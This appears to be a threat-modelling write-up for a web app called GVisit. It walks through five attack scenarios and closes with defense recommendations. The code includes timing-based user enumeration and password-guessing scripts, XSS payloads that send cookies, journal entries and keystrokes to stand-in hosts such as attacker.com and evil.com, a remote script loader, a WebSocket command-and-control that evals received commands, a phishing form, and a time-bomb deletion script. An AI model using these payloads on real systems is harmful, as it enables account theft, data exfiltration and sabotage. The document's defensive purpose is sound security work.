# Real-World Attack Scenarios for GVisit

## 🎭 Attack Scenario 1: The Corporate Spy

**Target**: A company using GVisit for internal journaling and presentations

### Step 1: Username Enumeration via Timing Attack
```python
# Attacker's script running from their laptop
import requests
import time

company_emails = [
    'john.smith@company.com',
    'jane.doe@company.com', 
    'ceo@company.com',
    'cfo@company.com',
    # ... hundreds more from LinkedIn
]

valid_users = []
for email in company_emails:
    start = time.time()
    requests.post('https://gvisit.company.com/journal_login', 
                  data={'username': email, 'password': 'wrong'})
    elapsed = time.time() - start
    
    if elapsed > 0.1:  # Valid user (password check took time)
        valid_users.append(email)
        print(f"[+] Found: {email}")
```
**Result**: In 5 minutes, attacker has list of all employees using GVisit

### Step 2: Targeted Password Attacks
```python
# Now attack only valid accounts with common passwords
passwords = ['Password123', 'Company2024!', 'Summer2024', firstname + '123']

for user in valid_users:
    for password in passwords:
        # Try login with rate limiting evasion
        time.sleep(2)  # Avoid rate limits
        if try_login(user, password):
            print(f"[!] COMPROMISED: {user}:{password}")
```

### Step 3: XSS Payload Injection
Once logged in as low-privilege user:
```javascript
// Inject this in a journal entry
<img src=x onerror="
// Steal all journal entries
const entries = Array.from(document.querySelectorAll('.journal-entry')).map(e => ({
    author: e.querySelector('.author').textContent,
    content: e.querySelector('.content').textContent,
    date: e.querySelector('.date').textContent
}));

// Send to attacker
fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        victim: document.cookie,
        entries: entries,
        url: window.location.href
    })
});

// Install keylogger
document.addEventListener('keypress', e => {
    fetch('https://attacker.com/log?key=' + e.key);
});
">
```

### Step 4: Privilege Escalation
```javascript
// If CEO views the infected journal entry, their session is stolen
// Attacker now has CEO access and can:
// 1. View all PowerPoint presentations (financial data, strategy)
// 2. Read all journal entries (confidential thoughts, plans)
// 3. Modify content to spread disinformation
```

**Total Impact**: 
- All employee journal entries stolen
- CEO's strategic plans exposed
- Financial presentations leaked
- Potential insider trading information obtained

---

## 🔓 Attack Scenario 2: The Disgruntled Ex-Employee

**Target**: Former employee seeking revenge

### Step 1: Persistent Backdoor via Remember Me
Before leaving, employee creates backdoor:
```python
# While still employed, they:
1. Check "Remember me for 30 days" on multiple devices
2. Copy the remember_token cookie value
3. Note their user ID from journal entries
```

### Step 2: Post-Employment Access
After being fired:
```python
# 2 weeks later, from home:
import requests

cookies = {
    'remember_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...',
    'session': 'deleted'  # Clear session to trigger remember me
}

# Auto-login still works!
response = requests.get('https://gvisit.company.com/journal',
                       cookies=cookies)
# They're back in!
```

### Step 3: Data Exfiltration
```python
# Download all accessible data
for entry_id in range(1, 10000):  # Brute force IDs
    try:
        data = requests.get(f'/journal/edit/{entry_id}', cookies=cookies)
        if "Entry not found" not in data.text:
            save_entry(data)
    except:
        pass

# Download all PowerPoints they still have access to
for ppt in ['financial_report', 'strategy_2024', 'layoff_plans']:
    download_ppt(ppt)
```

### Step 4: Sabotage
```javascript
// Inject time-bomb XSS that activates later
<script>
if (new Date() > new Date('2024-12-25')) {
    // Christmas surprise - delete all entries
    document.querySelectorAll('.delete-btn').forEach(btn => btn.click());
    // Or redirect to competitor
    window.location = 'https://competitor.com/we-are-better';
}
</script>
```

**Total Impact**:
- Continued access after termination
- Intellectual property theft
- Potential sabotage
- Reputation damage

---

## 💰 Attack Scenario 3: The Ransomware Gang

**Target**: Any GVisit installation with valuable data

### Step 1: Initial Compromise via Tag XSS
```javascript
// User innocently adds tag: <img src=logo.png>
// But attacker exploits parsing to inject:
<img src=x onerror="
// Download ransomware payload
const script = document.createElement('script');
script.src = 'https://evil.com/ransomware.js';
document.head.appendChild(script);
">
```

### Step 2: Ransomware Deployment
```javascript
// ransomware.js content:
async function encryptAllData() {
    // Get all journal entries
    const entries = await getAllEntries();
    
    // "Encrypt" them (actually just scramble)
    entries.forEach(entry => {
        entry.content = btoa(entry.content).split('').reverse().join('');
        updateEntry(entry.id, entry.content);
    });
    
    // Leave ransom note
    createEntry({
        title: '🔒 YOUR DATA HAS BEEN ENCRYPTED 🔒',
        content: 'Pay 1 Bitcoin to wallet abc123 for decryption key',
        tags: 'RANSOMWARE,URGENT,DO-NOT-DELETE'
    });
    
    // Lock out the user
    document.body.innerHTML = '<h1>RANSOMWARE - PAY TO UNLOCK</h1>';
}
```

### Step 3: Lateral Movement
```javascript
// Spread to all users who view infected entries
// Each view infects another user
// Exponential spread through organization
```

**Total Impact**:
- All journal data encrypted/lost
- Business operations disrupted
- Potential ransom payment
- Reputation damage
- Legal liability

---

## 🕵️ Attack Scenario 4: The Nation-State Actor

**Target**: Government agency using GVisit

### Step 1: Advanced Persistent Threat (APT)
```javascript
// Sophisticated XSS that hides itself
<svg onload="
// Anti-detection
if (window.location.hostname.includes('security')) return;

// Establish command & control
const c2 = new WebSocket('wss://legitimate-looking-domain.com/chat');

c2.onmessage = (event) => {
    // Execute commands from attacker
    eval(event.data);
};

// Periodic data exfiltration
setInterval(() => {
    // Send all new data since last check
    const newData = getNewEntries();
    c2.send(JSON.stringify(newData));
}, 3600000); // Every hour
">
```

### Step 2: Long-term Surveillance
- Monitors all journal entries for keywords
- Maps organizational structure
- Identifies key personnel and projects
- Waits for high-value information

### Step 3: Strategic Data Collection
```javascript
// When specific keywords detected:
if (content.includes('classified') || content.includes('operation')) {
    // Immediate exfiltration
    priorityExfil(entry);
    
    // Activate additional collection
    activateKeylogger();
    activateScreenCapture();
    activateMicrophoneRecording();
}
```

**Total Impact**:
- Long-term undetected surveillance
- Classified information leaked
- National security compromised
- Foreign intelligence advantage

---

## 🎣 Attack Scenario 5: The Social Engineer

**Target**: High-profile executive

### Step 1: Reconnaissance via Timing Attack
```python
# Find executive's username format
for format in ['jsmith', 'john.smith', 'smithj', 'john_smith']:
    if username_exists(format):
        print(f"Username format: {format}")
```

### Step 2: Phishing with XSS
```javascript
// Create fake but convincing IT notification
<div style="border: 2px solid red; padding: 20px; background: #fff;">
    <h2>⚠️ Security Alert from IT Department</h2>
    <p>Unusual activity detected on your account.</p>
    <p>Please verify your identity:</p>
    <form action="https://evil.com/phish" method="post">
        <input type="password" name="password" placeholder="Current Password" required>
        <input type="text" name="phone" placeholder="Phone (for 2FA)" required>
        <button type="submit">Verify Account</button>
    </form>
</div>
```

### Step 3: Account Takeover
With stolen credentials:
- Access all journal entries
- Find personal information (family, health, finances)
- Discover business strategies and vulnerabilities
- Identify blackmail material

### Step 4: Advanced Persistent Threat
```javascript
// Install persistent backdoor
localStorage.setItem('debug_mode', 'true');
localStorage.setItem('debug_endpoint', 'https://attacker.com/c2');

// Modify app behavior
const originalFetch = window.fetch;
window.fetch = function(...args) {
    // Send copy of all requests to attacker
    sendToAttacker(args);
    return originalFetch.apply(this, args);
};
```

**Total Impact**:
- Complete account compromise
- Personal information exposed
- Potential blackmail/extortion
- Business intelligence leaked

---

## 🛡️ Defense Lessons

### From These Scenarios We Learn:

1. **Timing Attacks**: Even 100ms differences can be exploited at scale
2. **XSS Impact**: One vulnerability can compromise entire organizations
3. **Persistence**: Attackers find creative ways to maintain access
4. **Lateral Movement**: Attacks spread between users rapidly
5. **Social Engineering**: Technical controls mean nothing if users are tricked

### Critical Defenses Needed:

1. **Input Sanitization**: Never trust user input, ever
2. **Output Encoding**: Always escape when displaying
3. **Constant-Time Operations**: No timing differences
4. **Secure Sessions**: Short timeouts, secure cookies
5. **Rate Limiting**: Prevent automated attacks
6. **Audit Logging**: Detect unusual patterns
7. **Security Headers**: CSP, HSTS, X-Frame-Options
8. **Regular Security Audits**: Find issues before attackers do

Remember: **Attackers only need to succeed once. Defenders must succeed every time.** 